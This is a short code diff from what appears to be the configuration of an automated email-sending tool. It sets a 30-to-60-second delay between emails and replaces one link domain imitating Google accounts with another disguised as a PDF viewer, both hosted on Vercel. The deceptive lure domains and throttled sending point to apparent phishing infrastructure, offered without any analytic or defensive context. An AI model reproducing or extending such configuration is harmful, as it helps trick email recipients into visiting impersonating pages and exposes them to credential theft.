@@ -293,7 +293,7 @@ const CONFIG = {
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://googlemail-accounts.vercel.app/",
+    "https://pdfviewerimg133929edhe778338393.vercel.app/",
   ],
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
